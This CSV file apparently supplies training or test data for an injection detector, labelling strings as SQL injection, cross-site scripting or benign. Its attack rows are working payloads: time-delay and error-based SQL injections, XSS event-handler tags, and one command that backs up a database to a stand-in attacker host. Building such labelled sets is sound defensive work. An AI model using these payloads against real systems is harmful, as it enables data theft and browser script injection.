payload,type
) or sleep(__TIME__)=,sqli
dasya4,benign
"<input onkeydown=""alert(1)"" contenteditable>test</input>",xss
95843081b,benign
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",xss
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",sqli
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationstart=""alert(1)""></thead>",xss
"pobla de segur 125,",benign
atolera,benign
00903443a,benign
"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
"<dir onkeydown=""alert(1)"" contenteditable>test</dir>",xss
"<t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;"">//[""'`-->]]>]</div>",xss
"<small onpaste=""alert(1)"" contenteditable>test</small>",xss
huesca,benign
78,benign
rudie@deuxmanagement.jo,benign
"<style>:target {transform: rotate(180deg);}</style><link id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></link>",xss
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",xss
lazure,benign
tracz,benign
-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sqli
10665,benign
1%'  )   or sleep  (  5  )   and   (  '%'  =  ',sqli
robin@comerciosdeaspe.info,benign
 AND 1083=1083 AND ('1427=1427,sqli
"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,sqli
"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",xss
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",sqli
"1%""  )   union all select null,null,null,null#",sqli
1  )   where 8375  =  8375,sqli
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",sqli
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",sqli
"1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524",sqli
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",sqli
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,sqli
"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>",xss
"<area onkeyup=""alert(1)"" contenteditable>test</area>",xss
<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>,xss
joffe,benign
<svg><set onbegin=alert(1) attributename=x dur=1s>,xss
"<strong onpaste=""alert(1)"" contenteditable>test</strong>",xss
"<style>:target {transform: rotate(180deg);}</style><samp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></samp>",xss
"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xyhi""  =  ""xyhi",sqli
select   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  select 6839 from mysql.db  )   end  )  #,sqli
"<rtc oncut=""alert(1)"" contenteditable>test</rtc>",xss
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",sqli
2.75E+15,benign
-3084%'   )    )    order by 1--,sqli
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,xss
"<sub onkeydown=""alert(1)"" contenteditable>test</sub>",xss
1  )   waitfor delay '0:0:5' and   (  2993  =  2993,sqli
itter,benign
42127,benign
09899393d,benign
"<samp onmouseup=""alert(1)"">test</samp>",xss
"<video><track default onload=alert(1) src=""data:text/vtt,WEBVTT""></video>",xss
beaumont@lasmilyuna.gi,benign
torres de berrelln,benign
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",sqli
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",sqli
<svg><spacer onload=alert(1)></spacer>,xss
-1886' where 5518  =  5518 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,sqli
"avinguda carrilet, 21,",benign
1%'   )    )    and 9198  =  9198--,sqli
estrad sivelli,benign
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",sqli
renoir@cocheacoche.fk,benign
"<code onkeypress=""alert(1)"" contenteditable>test</code>",xss
haslund@arvigar.sl,benign
"<image draggable=""true"" ondragenter=""alert(1)"">test</image>",xss
or 1 in   (  select @@version  )  --,sqli
p7g2na,benign
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",sqli
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationstart=""alert(1)""></code>",xss
select sleep  (  5  )   and 'gajm'  =  'gajm,sqli
bertra canamasa,benign
<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,xss
corota,benign
7uo09e5a1,benign
"<area draggable=""true"" ondragstart=""alert(1)"">test</area>",xss
diy$ambo,benign
<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>,xss
 ORDER BY 27# ,sqli
"<input onkeyup=""alert(1)"" contenteditable>test</input>",xss
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",sqli
"<tt onmouseleave=""alert(1)"">test</tt>",xss
"<big onmousedown=""alert(1)"">test</big>",xss
<command id=x tabindex=1 onactivate=alert(1)></command>,xss
pl. herrera de los navarros 68 12-h,benign
1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#,sqli
galce,benign
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,sqli
8.61E+15,benign
"<content draggable=""true"" ondragenter=""alert(1)"">test</content>",xss
BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',sqli
"<figcaption draggable=""true"" ondragleave=""alert(1)"">test</figcaption>",xss
" select * from users where id  =  1 or \.<\ union select 1,@@VERSION -- 1",sqli
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationstart=""alert(1)""></ruby>",xss
<svg><aside onload=alert(1)></aside>,xss
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",sqli
"<a onpaste=""alert(1)"" contenteditable>test</a>",xss
1' order by 1#,sqli
<script id=x tabindex=1 onbeforeactivate=alert(1)></script>,xss
<svg><tt onload=alert(1)></tt>,xss
almansa ingls,benign
"<html onmouseup=""alert(1)"">test</html>",xss
<body onresize=alert(1)>press F12!,xss
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",sqli
"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,sqli
1  )   where 6494  =  6494,sqli
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",sqli
